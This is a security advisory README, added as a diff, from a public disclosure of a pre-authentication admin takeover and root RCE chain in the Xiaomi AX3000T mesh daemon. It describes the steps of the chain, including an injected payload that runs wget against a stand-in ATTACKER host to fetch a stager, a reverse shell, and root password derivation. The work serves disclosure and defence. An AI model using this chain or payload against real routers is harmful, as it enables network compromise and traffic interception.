@@ -1,0 +1,206 @@
+# Xiaomi AX3000T (RD03v2) — `cab_meshd` pre-authentication admin takeover and root RCE
+
+**An unauthenticated attacker on the router's Wi-Fi obtains an interactive root
+shell — no credentials, no user interaction, no WAN cable.** Two independent
+vulnerabilities in the mesh daemon `cab_meshd` chain together: V1 leaks the
+router's admin login verifier via a hard-coded, firmware-global key; the minted
+admin session then plants a command-injection payload into a Wi-Fi config field that
+V2's root shell `eval` executes. The device stays online throughout. **Confirmed
+end-to-end on physical hardware with a live interactive root shell.**
+
+> ### Published 2026-09-28
+>
+> This is the public release of a coordinated-disclosure package, first reported to
+> Xiaomi on **2026-08-14** on a stated 45-day timeline. Nothing is patched.
+>
+> **It ships a working, weaponised proof-of-concept** — the full unauthenticated
+> over-the-air root chain — because for the analysed model, the **Xiaomi AX3000T
+> (`RD03v2`)**, escaping to OpenWrt is the only path off the vulnerable firmware, and
+> the exploit is what makes that install possible without opening the case. That
+> installer is **`RD03v2`-only**; it does not serve the other 28 verified model codes.
+> Read [Mitigations for owners](mitigations.md) before running anything.
+>
+> Reported in full to the vendor, and to CERT/CC via VINCE (`VRF#26-09-SFWHW`).
+> Timeline: [Disclosure](#disclosure).
+
+---
+
+## Affected product
+
+| | |
+|---|---|
+| Device | Xiaomi Router AX3000T (`xiaomi.router.rd03v2`, hardware `RD03v2`) |
+| Firmware | MiWiFi / XiaoQiang `romversion 2.0.28` (analysed and tested) |
+| Component | `/usr/sbin/cab_meshd` (mesh commissioning daemon) |
+| Service | TCP/UDP **19553**, on the LAN / Wi-Fi when the device runs as a mesh CAP (`INITTED=YES`) |
+
+The root causes are **firmware-global, and line-wide** — not per-device and not
+specific to this model. The hard-coded key is byte-identical in **28 Xiaomi and Redmi
+router model codes** across **three CPU architectures** (ARM64, ARM32, MIPS32el) and
+**three Wi-Fi generations (5, 6 and 7)** — from the sub-$25 Mi Router 4A Gigabit
+Edition to the current BE10000 flagship still being shipped. This was verified by
+downloading stock firmware, mostly from Xiaomi's own CDN, and extracting
+`/usr/sbin/cab_meshd`: **28 of 28 obtainable images contain the key, with no
+exceptions.** The `INITTED=YES` → `cab_meshd -S -i br-lan` exposure gate is likewise
+identical across models.
+
+Full table, hashes, firmware URLs and a reproduction script:
+[`evidence/cross-model/`](evidence/cross-model/). A single extraction from any one
+unit authenticates to every other, so **a per-model patch does not resolve this.**
+
+---
+
+## Primary finding — pre-auth admin takeover (confirmed)
+
+An attacker who can reach TCP 19553 completes the mesh handshake using a
+**hard-coded, firmware-global HMAC key** — no per-device secret, no client
+certificate — which drives the daemon to `ST_RUNNING`. On that transition the CAP
+**transmits its own web-admin login verifier** (`web_passwd256`, the exact SHA-256
+the web login checks) to the peer inside the config-sync message. The attacker
+computes `sha256(nonce ‖ web_passwd256)` and logs into the web UI as `admin`.
+
+- No credentials, no memory corruption, no user interaction.
+- **Unconditional** — fires the moment `ST_RUNNING` is reached.
+- **Confirmed end-to-end on physical hardware** (leaked the verifier, minted a
+  valid admin session, read back real admin data). → [`chain1-admin-takeover.md`](chain1-admin-takeover.md)
+
+Full admin over the router is itself total compromise: rewrite DNS to MITM all
+traffic, open WAN management / port-forwards, disable the firewall, read Wi-Fi and
+guest passwords, and pivot to LAN devices. The identical key across units makes a
+single extraction weaponisable fleet-wide.
+
+The enabling design flaws:
+
+1. **CWE-798** — a hard-coded, firmware-global HMAC key (`838d364d…`, role byte
+   `q`/`x`) is the sole mesh authenticator.
+2. **CWE-295** — the TLS server sets `SSL_VERIFY_NONE`, accepting any client with
+   no certificate.
+3. **CWE-522/200** — the router sends its admin credential verifier
+   (`web_passwd256`) to peers in the sync config.
+
+---
+
+## Primary finding #2 — pre-auth root RCE (confirmed on hardware)
+
+The same `eval` sink that V1's handshake reaches also accepts attacker-controlled
+Wi-Fi configuration values planted via the admin API. V1 → V2 chains into a
+**full-length, over-the-air root RCE** with an interactive root shell — **confirmed
+end-to-end on physical hardware**.
+
+### OTA combined chain (the headline result)
+
+1. V1 leaks `web_passwd256` over Wi-Fi → mints an admin `stok`.
+2. Admin API (`set_wifi_without_restart`) plants command-injection payloads into the
+   `encryption` UCI keys for the 2.4 GHz and 5 GHz bands. These fields are **exempt**
+   from `hackCheck` (the web input sanitizer that blocks `` ;|$& ``), so arbitrary
+   shell metacharacters pass through. The SSID is preserved (no visible change).
+3. A `type-4→5→7` trigger fires `cap_init`. Inside `do_cap_init`,
+   `mgmt_2g=$(uci get wireless.<iface>.encryption)` reads the poisoned value
+   **raw** (not base64-laundered) and passes it into `mimesh_init.sh:717`'s `eval`.
+4. The injected `\" wget http://ATTACKER/s -O /tmp/x #` breaks out of the
+   `parse_json` quoting via `\"`→`"` un-escaping. `eval` becomes
+   `mgmt_2g="" wget … #"…` — the shell assignment-prefix trick runs `wget` as root.
+   The 5 GHz band carries `\" sh /tmp/x #`, executing the downloaded stager.
+5. The stager calls back (`uid=0`), self-repairs the Wi-Fi (restores valid `psk2`
+   encryption so the AP stays online), and opens a persistent reconnecting reverse
+   shell.
+
+- **Unlimited payload budget** — the `encryption` field has no length cap.
+- **Confirmed on physical hardware**: root callback (`uid=0_user=root`), interactive
+  BusyBox ash root shell, full `netstat -tlnp`, device model `RD03v2`.
+- **CWE-78.** → [`chain2-root-rce.md`](chain2-root-rce.md)
+
+### Direct injection variants (emulation-confirmed)
+
+The `eval` sink is also reachable through two direct (non-admin) injection paths,
+both confirmed in emulation on the stock binary and scripts:
+
+- **CAP/LAN variant** (initialised router): a **~4-character one-shot** via the
+  type-4 plant; `cap_init` self-gates (`NETMODE=whc_cap`) after the first use.
+- **RE/WAN variant** (fresh/unconfigured device): **ungated and repeatable** with a
+  **~36-byte** payload budget — enough for a `wget|sh` stager. Each link confirmed
+  live in emulation; the full single-run chain blocked only by an emulator-only
+  WAN-gateway check.
+
+The OTA combined chain supersedes these for practical exploitation.
+
+## Secondary findings
+
+Presented with their evidence status — see
+[`secondary-findings.md`](secondary-findings.md):
+
+- **Credential hygiene:** the `/etc/shadow` root hash is a **static placeholder
+  shared across models/firmware**, and the real per-device root password is
+  **derivable from the label serial** via the publicly-reversed `mkxqimage`
+  algorithm (`md5(SN ‖ salt)[:8]`). Telnet/SSH are locked in 2.0.x, so there is no
+  network login surface today, but the credential design is weak.
+- **Latent shared-code RCE — `misystem/download_search`:** a `?string` verifier
+  that bypasses the web input filter, concatenated unquoted into a root
+  `forkExec`. Doubly closed on RD03v2 (feature-gated off + a realpath/`/mnt`
+  validator), but live on any SKU where `apps.download="1"`. Worth Xiaomi's
+  attention as shared code.
+
+---
+
+## Repository layout
+
+```
+README.md                    this file
+ADVISORY.md                  formal advisory (CVSS, CWEs, affected versions)
+chain1-admin-takeover.md     PRIMARY #1 — admin takeover (V1), full writeup
+chain2-root-rce.md           PRIMARY #2 — root RCE (V2), full writeup
+technical-appendix.md        cab_meshd internals: key, handshake, wire protocol, addresses
+secondary-findings.md        credentials (V3), download_search (V4)
+remediation.md               recommended fixes, for the vendor
+mitigations.md               what owners can do today (unpatched), and how to triage
+LICENSE                      MIT — covers the code
+LICENSE-docs                 CC BY 4.0 — covers the prose
+NOTICE                       authorised-use, one-shot and no-warranty terms — read first
+evidence/
+  hardware-validation.md     what was reproduced on physical hardware, and what was not
+  independent-validation.md  third-party 2023 capture confirming the key, wire format
+                             and handshake — on a different model, predating this work
+  verify_public_capture.py   reproduces that confirmation (pure computation, sends nothing)
+  cross-model/               the key across the Xiaomi router line: method, results, hashes
+poc/
+  README.md                  how to run the PoCs
+  init_router.py             brings a factory unit into the testable (initialised) state
+  handshake.py               mesh protocol driver (auth to ST_RUNNING; dumps sync config)
+  extract_admin.py           PRIMARY PoC — leak verifier -> mint admin session
+  ota_rce.py                 PRIMARY PoC — full OTA root RCE (V1+V2 combined), confirmed on hardware
+  rce_poc.py                 research PoC for the direct injection sink (CAP/LAN path)
+  exploit.py                 injection-sink variant, documented primitive
+```
+
+## Disclosure
+
+| Date (UTC) | Event |
+|---|---|
+| **2026-08-14** | **Day 0** — initial notification to `security@xiaomi.com`: 45-day timeline, publication date stated |
+| 2026-08-14 | Priority anchored with OpenTimestamps (Bitcoin-confirmed 2026-08-15) |
+| 2026-08-17 | Xiaomi Security Center acknowledged (**day 3**). Full technical package sent, encrypted to the MiSRC PGP key |
+| 2026-09-11 | **Day 28** — no substantive technical response in the 25 days since acknowledgement. Report filed with CERT/CC via VINCE: **`VRF#26-09-SFWHW`** |
+| **2026-09-28** | **Day 45 — publication.** Technical advisory *and* weaponised proof-of-concept, together |
+
+The initial notification said weaponised PoC code would be withheld for a further
+**30 days after a fix**. That plan was **changed on 2026-09-11**, and the change is
+recorded in the coordination log. The reasoning: Xiaomi has not confirmed
+reproduction, has committed to no timeline, and its published policy allows 180 days
+*after a fix plan is complete*. Part of the affected range (RD05, RD13, RA82) appears
+to have no update channel at all. Holding the exploit indefinitely would leave owners
+of unpatched devices with nothing they can act on — the opposite of the point.
+
+**Why the PoC ships with the advisory.** The objective is to let owners of the
+analysed model — the **Xiaomi AX3000T (`RD03v2`)** — install OpenWrt **over the air**,
+without opening the case or attaching UART. That capability *is* the exploit chain, so
+the installer and the exploit cannot be separated. The installer is **`RD03v2`-only**:
+it does not apply to any other affected model code, and OpenWrt support across the rest
+of the range is model-specific — see [Mitigations for owners](mitigations.md) §4 and
+[`evidence/cross-model/`](evidence/cross-model/). The installer itself is
+[`ADCDS/ax3000t-ota-install`](https://github.com/ADCDS/ax3000t-ota-install).
+
+All testing was performed by the reporter on devices purchased for this purpose. No
+third-party or production systems were involved.
+
+**Credit:** Adriel Santos. CVE handling is with CERT/CC and the Xiaomi CNA
+(`CNA-2020-0019`).
